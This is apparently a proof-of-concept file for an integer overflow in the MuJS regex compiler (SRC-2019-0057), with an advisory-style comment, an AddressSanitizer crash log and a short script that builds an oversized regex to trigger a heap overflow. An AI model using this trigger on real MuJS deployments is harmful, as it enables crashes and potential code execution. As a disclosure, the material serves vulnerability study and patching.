@@ -1,0 +1,127 @@
+/*
+
+Artifex MuJS regcompx pattern Integer Overflow Remote Code Execution Vulnerability
+SRC-2019-0057
+
+### Summary:
+
+An integer overflow can occur when processing specially crafted regex strings that can result in a heap based buffer overflow. An attacker can leverage this to achieve remote code execution.
+
+### Analysis:
+
+817: Reprog *regcompx(void *(*alloc)(void *ctx, void *p, int n), void *ctx,
+818:    const char *pattern, int cflags, const char **errorp)
+819: {
+820:    struct cstate g;
+821:    Renode *node;
+822:    Reinst *split, *jump;
+823:    int i, n;
+824: 
+825:    g.pstart = NULL;
+826:    g.prog = NULL;
+827: 
+828:    if (setjmp(g.kaboom)) {
+829:        if (errorp) *errorp = g.error;
+830:        alloc(ctx, g.pstart, 0);
+831:        alloc(ctx, g.prog, 0);
+832:        return NULL;
+833:    }
+834: 
+835:    g.prog = alloc(ctx, NULL, sizeof (Reprog));
+836:    if (!g.prog)
+837:        die(&g, "cannot allocate regular expression");
+838:    n = strlen(pattern) * 2;
+839:    if (n > 0) {
+840:        g.pstart = g.pend = alloc(ctx, NULL, sizeof (Renode) * n);
+841:        if (!g.pstart)
+842:            die(&g, "cannot allocate regular expression parse list");
+843:    }
+
+We can see that the overflow happens from sizeof (Renode) * n where n is the length of our pattern twice over. The size of Renode is 32 so if we provide a pattern of say, length 67108869 we can do this: (67108869*2)*32 = 0x100000140. So essentially, the g.pend buffer will be of size 0x140 or 320 bytes, which will trigger "undefined" behaviour. That behaviour is actually a heap based buffer overflow when calling parsealt on line 854.
+
+### Proof of Concept:
+
+steven@debian:~/mujs/mujs$ build/sanitize/mujs ~/mujs/poc.js
+=================================================================
+==9530==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61200000bd00 at pc 0x563ad960273b bp 0x7fff92f01860 sp 0x7fff92f01858
+WRITE of size 1 at 0x61200000bd00 thread T0
+    #0 0x563ad960273a in newnode /home/steven/mujs/mujs/regexp.c:409
+    #1 0x563ad9602dfa in parseatom /home/steven/mujs/mujs/regexp.c:465
+    #2 0x563ad9603749 in parserep /home/steven/mujs/mujs/regexp.c:537
+    #3 0x563ad9603af5 in parsecat /home/steven/mujs/mujs/regexp.c:561
+    #4 0x563ad9603c4c in parsealt /home/steven/mujs/mujs/regexp.c:573
+    #5 0x563ad96056e2 in js_regcompx /home/steven/mujs/mujs/regexp.c:868
+    #6 0x563ad95e6983 in js_newregexp /home/steven/mujs/mujs/jsregexp.c:19
+    #7 0x563ad95e792a in jsB_new_RegExp /home/steven/mujs/mujs/jsregexp.c:147
+    #8 0x563ad95f0486 in jsR_callcfunction /home/steven/mujs/mujs/jsrun.c:1037
+    #9 0x563ad95f1154 in js_construct /home/steven/mujs/mujs/jsrun.c:1106
+    #10 0x563ad95f49f0 in jsR_run /home/steven/mujs/mujs/jsrun.c:1502
+    #11 0x563ad95f022b in jsR_callscript /home/steven/mujs/mujs/jsrun.c:1020
+    #12 0x563ad95f0ce5 in js_call /home/steven/mujs/mujs/jsrun.c:1075
+    #13 0x563ad95f697e in js_dofile /home/steven/mujs/mujs/jsstate.c:205
+    #14 0x563ad9609af4 in main /home/steven/mujs/mujs/main.c:338
+    #15 0x7f3bfcace2e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
+    #16 0x563ad95ae929 in _start (/home/steven/mujs/mujs/build/sanitize/mujs+0x16929)
+
+0x61200000bd00 is located 0 bytes to the right of 320-byte region [0x61200000bbc0,0x61200000bd00)
+allocated by thread T0 here:
+    #0 0x7f3bfd460090 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.3+0xc2090)
+    #1 0x563ad95f5e97 in js_defaultalloc /home/steven/mujs/mujs/jsstate.c:16
+    #2 0x563ad9605586 in js_regcompx /home/steven/mujs/mujs/regexp.c:854
+    #3 0x563ad95e6983 in js_newregexp /home/steven/mujs/mujs/jsregexp.c:19
+    #4 0x563ad95e792a in jsB_new_RegExp /home/steven/mujs/mujs/jsregexp.c:147
+    #5 0x563ad95f0486 in jsR_callcfunction /home/steven/mujs/mujs/jsrun.c:1037
+    #6 0x563ad95f1154 in js_construct /home/steven/mujs/mujs/jsrun.c:1106
+    #7 0x563ad95f49f0 in jsR_run /home/steven/mujs/mujs/jsrun.c:1502
+    #8 0x563ad95f022b in jsR_callscript /home/steven/mujs/mujs/jsrun.c:1020
+    #9 0x563ad95f0ce5 in js_call /home/steven/mujs/mujs/jsrun.c:1075
+    #10 0x563ad95f697e in js_dofile /home/steven/mujs/mujs/jsstate.c:205
+    #11 0x563ad9609af4 in main /home/steven/mujs/mujs/main.c:338
+    #12 0x7f3bfcace2e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/steven/mujs/mujs/regexp.c:409 in newnode
+Shadow bytes around the buggy address:
+  0x0c247fff9750: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c247fff9760: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c247fff9770: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+  0x0c247fff9780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c247fff9790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0c247fff97a0:[fa]fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+  0x0c247fff97b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c247fff97c0: 00 00 00 00 00 00 00 00 00 02 fa fa fa fa fa fa
+  0x0c247fff97d0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x0c247fff97e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0c247fff97f0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==9530==ABORTING
+
+*/
+
+var s = 'A';
+for(var i=0;i<26;i++) {
+  s = s+s;
+}
+s = '[A-Z]'+s;
+
+// s is now 67108869 in length
+r = new RegExp(s);
